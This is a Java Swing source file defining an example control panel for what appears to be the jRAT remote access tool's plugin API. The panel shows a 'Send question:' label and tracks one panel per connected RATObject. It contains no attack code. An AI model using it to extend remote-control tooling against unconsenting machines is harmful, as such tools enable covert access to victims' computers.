package pro.jrat.client.ui;

import java.util.HashMap;
import java.util.Map;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JLabel;

import pro.jrat.api.BaseControlPanel;
import pro.jrat.api.RATObject;

@SuppressWarnings("serial")
public class ExampleControlPanel extends BaseControlPanel {

	public static final Map<RATObject, ExampleControlPanel> INSTANCES = new HashMap<RATObject, ExampleControlPanel>();
	
	public ExampleControlPanel() {
		INSTANCES.put(super.getServer(), this);
		
		JLabel lblSendQuestion = new JLabel("Send question:");
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGroup(groupLayout.createSequentialGroup()
					.addContainerGap()
					.addComponent(lblSendQuestion)
					.addContainerGap(394, Short.MAX_VALUE))
		);
		groupLayout.setVerticalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGroup(groupLayout.createSequentialGroup()
					.addContainerGap()
					.addComponent(lblSendQuestion)
					.addContainerGap(275, Short.MAX_VALUE))
		);
		setLayout(groupLayout);

	}

	@Override
	public void onClose() {
		INSTANCES.remove(super.getServer());
	}
}
